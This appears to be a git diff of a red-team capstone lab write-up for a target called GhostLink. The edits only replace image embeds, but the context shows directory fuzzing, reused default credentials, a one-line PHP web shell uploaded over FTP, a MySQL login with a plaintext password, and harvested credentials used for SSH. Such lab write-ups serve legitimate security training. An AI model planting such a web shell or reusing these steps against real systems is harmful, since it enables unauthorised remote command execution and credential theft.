@@ -13,7 +13,7 @@ This is a **learning-focused** capstone: think like an enterprise red team ope
 ### GhostLink Scan Report 
 
 
-![[Ghostlink HTTP.png]]
+![Ghostlink Landing page](./Ghostlink_presentaion_stuff/Ghostlink_HTTP.png.png)
 ***Attack Log(Commands used for service exploitation)***
 
 1) -sn : 
@@ -65,7 +65,7 @@ http-title: `GhostLink :: Portal` or `http://192.168.1.81/`
 **Recon**
 
 Legacy synchronization Default credentials SecureGhostLink123 is still in effect
-![[dir fuzz.png]]
+![Directory Fuzzing Results](./Ghostlink_presentaion_stuff/dir_fuzz.png)
 performed a dir fuzz suing ghostbuster to find interesting links:
 `http://192.168.1.81/secure/`
 `http://192.168.1.81/secure/users.db.enc` : the database that likely contains user info that can be used to exploit the other services.
@@ -81,7 +81,7 @@ performed a dir fuzz suing ghostbuster to find interesting links:
 - Legacy synchronisation Default credentials `SecureGhostLink123` is still in effect
 - Note: All sensitive data is stored securely in an encrypted isolated backup for system restoration purposes by Internal IT with `AES256`.
 
-![[encoded userdb.png]]
+![Encoded userdb](./Ghostlink_presentaion_stuff/encoded_userdb.png)
 `file users.db.enc`  returns:         
 `'users.db.enc: openssl enc'd data with salted password, base64 encoded'`
 
@@ -125,7 +125,7 @@ The `dev` user is the most promising target for initial access as it's specifica
 ![[ftp success.png]]
 
  - Web shell and Initial foothold: I realised the ftp gave me access to upload/put files so I created a php web shell and put it in the list of folders using FTP
- ![[Insert_shell_v_ftp.png]]
+ ![inserting shell](./Ghostlink_presentaion_stuff/Insert_shell_v_ftp.png)
 ```
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 ftp 192.168.1.81
@@ -166,12 +166,12 @@ the service was running on **localhost:3306**, even though it wasn't visible in
 mysql -u dev -pGhostSync@FTP%123
 ```
 to get 
-![[initial mysqlaccess.png]]
+![Initial MySQL access](./Ghostlink_presentaion_stuff/initial_mysqlaccess.png)
 
 - I decided to look at the creds table in more depth 
-![[creds.png]]
+![Creds Table](./Ghostlink_presentaion_stuff/creds.png)
 sure enough I found some passwords and used them to gain access to ssh
-![[ssh login.png]]
+![SSH login](./Ghostlink_presentaion_stuff/ssh_login.png)
 - found the first flag in user.txt 
 ```
 ghost@ghostlink:-$ cat user.txt
